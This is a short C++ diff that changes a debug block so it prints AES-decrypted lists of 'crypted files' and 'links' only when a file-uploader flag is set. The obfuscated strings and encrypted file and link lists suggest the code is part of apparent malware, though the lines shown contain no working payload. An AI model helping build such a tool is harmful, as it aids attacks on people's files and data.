@@ -232,8 +232,8 @@ int main(int argc, char* argv[]) {
     if (DEBUG) {
         cout << skCrypt("\nEncoded ") << aes_decrypt(KEY, info_txt, IV) << skCrypt("\n");
         cout << skCrypt("Crypted files:\n") << aes_decrypt(KEY, cryptedFiles_txt, IV) << skCrypt("\n");
-        cout << skCrypt("Links:\n") << aes_decrypt(KEY, links_txt, IV) << skCrypt("\n");
-        Sleep(5000);
+        if (FILE_UPLOADER)
+            cout << skCrypt("Links:\n") << aes_decrypt(KEY, links_txt, IV) << skCrypt("\n");
         system("pause");
     }
 
